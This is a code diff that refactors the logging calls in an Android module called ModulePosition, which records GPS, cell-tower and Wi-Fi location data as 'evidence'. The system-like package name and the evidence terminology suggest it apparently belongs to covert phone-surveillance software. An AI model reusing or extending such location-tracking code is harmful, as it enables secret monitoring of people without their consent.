@@ -26,14 +26,14 @@ import android.os.Bundle;
 import com.android.networking.CellInfo;
 import com.android.networking.Core;
 import com.android.networking.Device;
-import com.android.networking.LogR;
 import com.android.networking.ServiceCore;
 import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.conf.ConfigurationException;
-import com.android.networking.evidence.Evidence;
+
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.evidence.LogR;
 import com.android.networking.interfaces.IncrementalLog;
 import com.android.networking.module.position.GPSLocatorAuto;
 import com.android.networking.util.ByteArray;
@@ -79,7 +79,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		if (gpsEnabled) {
 			synchronized (logGPSlock) {
 				if (logIncrGPS == null) {
-					logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0,
+					logIncrGPS = new LogR(EvidenceType.LOCATION_NEW, getAdditionalData(0,
 							LOG_TYPE_GPS));
 				}
 			}
@@ -113,9 +113,9 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		}
 
 		if (info.gsm) {
-			logCell = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_GSM));
+			logCell = new LogR(EvidenceType.LOCATION_NEW, getAdditionalData(0, LOG_TYPE_GSM));
 		} else if (info.cdma) {
-			logCell = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(0, LOG_TYPE_CDMA));
+			logCell = new LogR(EvidenceType.LOCATION_NEW, getAdditionalData(0, LOG_TYPE_CDMA));
 		}
 
 		return logCell;
@@ -297,7 +297,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		databuffer.write(payload);
 
 		// delimiter
-		databuffer.writeInt(Evidence.E_DELIMITER);
+		databuffer.writeInt(LogR.E_DELIMITER);
 
 		if (Cfg.DEBUG) {
 			Check.ensures(databuffer.getPosition() == size, "saveEvidence wrong size"); //$NON-NLS-1$
@@ -546,7 +546,7 @@ public class ModulePosition extends BaseInstantModule implements IncrementalLog,
 		}
 
 		synchronized (logWifilock) {
-			LogR logWifi = new LogR(EvidenceType.LOCATION_NEW, LogR.LOG_PRI_STD, getAdditionalData(results.size(),
+			LogR logWifi = new LogR(EvidenceType.LOCATION_NEW, getAdditionalData(results.size(),
 					LOG_TYPE_WIFI));
 
 			for (ScanResult wifi : results) {
